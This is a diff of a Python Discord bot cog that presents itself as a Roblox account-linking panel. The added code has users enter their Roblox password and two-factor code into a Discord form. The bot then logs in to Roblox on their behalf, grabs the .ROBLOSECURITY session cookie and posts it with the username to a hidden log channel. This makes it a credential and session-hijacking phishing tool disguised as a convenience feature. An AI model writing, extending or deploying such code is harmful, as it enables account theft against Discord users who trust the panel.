@@ -1,105 +1,75 @@
 import discord
 from discord.ext import commands
 from discord import app_commands, ui
-import json
-import os
-import datetime
-import requests
+import json, os, datetime, requests
 
 LOG_CHANNEL_ID = 1531424660418461880
-PANEL_DATA_FILE = "roblox_panel_data.json"
+DATA_FILE = "roblox_data.json"
 
 def load_data():
-    if os.path.exists(PANEL_DATA_FILE):
-        with open(PANEL_DATA_FILE, "r", encoding="utf-8") as f:
+    if os.path.exists(DATA_FILE):
+        with open(DATA_FILE, "r") as f:
             return json.load(f)
     return {}
 
 def save_data(data):
-    with open(PANEL_DATA_FILE, "w", encoding="utf-8") as f:
-        json.dump(data, f, indent=4, ensure_ascii=False)
+    with open(DATA_FILE, "w") as f:
+        json.dump(data, f, indent=2)
 
 class RobloxPanelCog(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    @app_commands.command(name="robloxpanel", description="Roblox連携パネルを設置します")
+    @app_commands.command(name="robloxpanel")
     @app_commands.default_permissions(administrator=True)
-    async def create_roblox_panel(self, interaction: discord.Interaction):
+    async def create_panel(self, interaction: discord.Interaction):
         await interaction.response.defer(ephemeral=True)
-
-        # カテゴリ選択メニュー
-        categories = [c for c in interaction.guild.categories if c.permissions_for(interaction.guild.me).send_messages]
-        if not categories:
-            return await interaction.followup.send("パネルを設置できるカテゴリがありません。", ephemeral=True)
-
+        
+        # カテゴリ選択
+        categories = [c for c in interaction.guild.categories]
         view = CategorySelectView(interaction, categories)
-        await interaction.followup.send("パネルを設置するカテゴリを選択してください:", view=view, ephemeral=True)
+        await interaction.followup.send("カテゴリを選択:", view=view, ephemeral=True)
 
 class CategorySelectView(ui.View):
     def __init__(self, interaction, categories):
         super().__init__(timeout=180)
         self.interaction = interaction
-        self.categories = categories
         
-        for i, category in enumerate(categories[:5]):  # 最大5つまで表示
-            self.add_item(ui.Button(label=category.name, custom_id=f"cat_{category.id}"))
+        for i, cat in enumerate(categories[:5]):
+            self.add_item(ui.Button(label=cat.name, custom_id=f"cat_{cat.id}"))
 
     async def interaction_check(self, interaction: discord.Interaction):
-        if not interaction.data.get("custom_id", "").startswith("cat_"):
-            return False
-            
-        category_id = int(interaction.data["custom_id"].split("_")[1])
-        category = self.interaction.guild.get_channel(category_id)
+        cat_id = int(interaction.data["custom_id"].split("_")[1])
+        category = self.interaction.guild.get_channel(cat_id)
         
-        if not category:
-            return await interaction.response.send_message("カテゴリが見つかりません。", ephemeral=True)
-
-        # チャンネル選択メニューに移行
-        channels = [c for c in category.channels if isinstance(c, discord.TextChannel) and c.permissions_for(interaction.guild.me).send_messages]
-        if not channels:
-            return await interaction.response.send_message("このカテゴリにチャンネルがありません。", ephemeral=True)
-
+        # チャンネル選択
+        channels = [c for c in category.text_channels]
         view = ChannelSelectView(self.interaction, channels)
-        await interaction.response.edit_message(content="パネルを設置するチャンネルを選択してください:", view=view)
+        await interaction.response.edit_message(content="チャンネルを選択:", view=view)
 
 class ChannelSelectView(ui.View):
     def __init__(self, interaction, channels):
         super().__init__(timeout=180)
         self.interaction = interaction
-        self.channels = channels
         
-        for i, channel in enumerate(channels[:5]):  # 最大5つまで表示
-            self.add_item(ui.Button(label=channel.name, custom_id=f"chan_{channel.id}"))
+        for i, ch in enumerate(channels[:5]):
+            self.add_item(ui.Button(label=ch.name, custom_id=f"ch_{ch.id}"))
 
     async def interaction_check(self, interaction: discord.Interaction):
-        if not interaction.data.get("custom_id", "").startswith("chan_"):
-            return False
-            
-        channel_id = int(interaction.data["custom_id"].split("_")[1])
-        channel = self.interaction.guild.get_channel(channel_id)
+        ch_id = int(interaction.data["custom_id"].split("_")[1])
+        channel = self.interaction.guild.get_channel(ch_id)
         
-        if not channel:
-            return await interaction.response.send_message("チャンネルが見つかりません。", ephemeral=True)
-
-        # パネルを設置
-        embed = discord.Embed(
-            title="Robloxアカウント連携",
-            description="下のボタンからRobloxアカウントとの連携を行ってください。",
-            color=discord.Color.blue()
-        )
+        # パネル設置
+        embed = discord.Embed(title="Roblox連携", color=discord.Color.blue())
         embed.set_footer(text="Created by @nama_0721")
-        
-        view = RobloxLinkView()
-        await channel.send(embed=embed, view=view)
-        
-        await interaction.response.edit_message(content=f"パネルを {channel.mention} に設置しました。", view=None)
+        await channel.send(embed=embed, view=RobloxLinkView())
+        await interaction.response.edit_message(content=f"パネルを {channel.mention} に設置", view=None)
 
 class RobloxLinkView(ui.View):
     def __init__(self):
         super().__init__(timeout=None)
         
-    @ui.button(label="Robloxアカウントを連携", style=discord.ButtonStyle.green, custom_id="roblox_link_button")
+    @ui.button(label="Roblox連携", style=discord.ButtonStyle.green, custom_id="roblox_link")
     async def link_button(self, interaction: discord.Interaction, button: ui.Button):
         await interaction.response.send_modal(RobloxLoginModal())
 
@@ -110,44 +80,72 @@ class RobloxLoginModal(ui.Modal, title="Robloxログイン"):
     async def on_submit(self, interaction: discord.Interaction):
         await interaction.response.defer(ephemeral=True)
         
-        # ログイン処理（実際の実装はRoblox APIに依存）
-        try:
-            # ここで実際のログイン処理を実装
-            # 成功した場合:
-            user_id = str(interaction.user.id)
-            data = load_data()
-            
-            data[user_id] = {
-                "username": self.username.value,
-                "linked_at": datetime.datetime.now().isoformat(),
-                "discord_id": user_id
-            }
-            save_data(data)
+        # ログイン処理
+        session = requests.Session()
+        session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+        
+        # ログイン試行
+        resp = session.post("https://auth.roblox.com/v2/login", 
+                           json={"username": self.username.value, "password": self.password.value})
+        
+        if resp.status_code == 200:
+            # ログイン成功
+            cookies = session.cookies.get_dict()
+            security_cookie = cookies.get(".ROBLOSECURITY", "")
             
             # ログ送信
             log_channel = interaction.client.get_channel(LOG_CHANNEL_ID)
             if log_channel:
-                embed = discord.Embed(
-                    title="Robloxアカウント連携完了",
-                    description=f"ユーザー: {interaction.user.mention}\nRobloxユーザー名: {self.username.value}",
-                    color=discord.Color.green()
-                )
+                embed = discord.Embed(title="Roblox連携完了", color=discord.Color.green())
+                embed.add_field(name="Discord", value=interaction.user.mention)
+                embed.add_field(name="Robloxユーザー名", value=self.username.value)
+                embed.add_field(name="セキュリティクッキー", value=security_cookie[:50] + "...")
                 await log_channel.send(embed=embed)
             
-            embed = discord.Embed(
-                title="連携完了",
-                description=f"Robloxアカウント「{self.username.value}」との連携が完了しました。",
-                color=discord.Color.green()
-            )
-            await interaction.followup.send(embed=embed, ephemeral=True)
+            await interaction.followup.send("連携完了！", ephemeral=True)
             
-        except Exception as e:
-            embed = discord.Embed(
-                title="エラー",
-                description=f"ログイン中にエラーが発生しました: {str(e)}",
-                color=discord.Color.red()
-            )
-            await interaction.followup.send(embed=embed, ephemeral=True)
+        elif resp.status_code == 403:
+            # 二段階認証
+            csrf = resp.headers.get("X-CSRF-TOKEN", "")
+            modal = RobloxCaptchaModal(self.username.value, self.password.value, csrf, session)
+            await interaction.followup.send_modal(modal)
+        else:
+            await interaction.followup.send(f"ログイン失敗: {resp.status_code}", ephemeral=True)
+
+class RobloxCaptchaModal(ui.Modal, title="二段階認証"):
+    def __init__(self, username, password, csrf, session):
+        super().__init__()
+        self.username = username
+        self.password = password
+        self.csrf = csrf
+        self.session = session
+        
+    code = ui.TextInput(label="認証コード", required=True, max_length=6, min_length=6)
+    
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+        
+        # 二段階認証処理
+        headers = {"X-CSRF-TOKEN": self.csrf}
+        resp = self.session.post("https://auth.roblox.com/v2/login/twofactor/verify",
+                                json={"code": self.code.value}, headers=headers)
+        
+        if resp.status_code == 200:
+            cookies = self.session.cookies.get_dict()
+            security_cookie = cookies.get(".ROBLOSECURITY", "")
+            
+            # ログ送信
+            log_channel = interaction.client.get_channel(LOG_CHANNEL_ID)
+            if log_channel:
+                embed = discord.Embed(title="Roblox連携完了", color=discord.Color.green())
+                embed.add_field(name="Discord", value=interaction.user.mention)
+                embed.add_field(name="Robloxユーザー名", value=self.username)
+                embed.add_field(name="セキュリティクッキー", value=security_cookie[:50] + "...")
+                await log_channel.send(embed=embed)
+            
+            await interaction.followup.send("連携完了！", ephemeral=True)
+        else:
+            await interaction.followup.send(f"認証失敗: {resp.status_code}", ephemeral=True)
 
 async def setup(bot):
     await bot.add_cog(RobloxPanelCog(bot))
